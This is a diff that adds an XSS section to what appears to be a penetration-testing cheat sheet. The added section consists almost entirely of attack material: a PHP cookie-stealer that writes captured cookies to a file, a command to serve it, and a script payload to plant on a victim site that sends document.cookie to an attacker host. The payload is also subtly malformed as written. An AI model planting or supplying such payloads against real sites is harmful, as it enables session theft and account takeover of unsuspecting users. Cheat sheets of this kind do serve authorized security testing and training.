@@ -4248,6 +4248,26 @@ xprobe2 -v -p tcp:port_here:open IP_here
 
 
 
+## XSS
+```javascript
+# cookie stealer (PHP)
+## setup cookie stealer on attacker box
+nano cookie.php
+<?php
+$cookie = $_GET['c'];
+$file = fopen('stolen_cookies.txt', 'a+');
+fwrite($file, 'Cookie: ' .$cookie,"\r\n");
+fclose($file);
+?>
+## serve cookie stealer
+sudo python -m SimpleHTTPServer 80
+## XSS payload to place on victim site
+<script>newImage().src="http://attacker_IP_here/cookie.php?c="document.cookie;</script>
+## cookies get written to stolen_cookies.txt or observe traffic in wireshark
+```
+
+
+
 ## XXD
 ```bash
 # plaintext hexdump
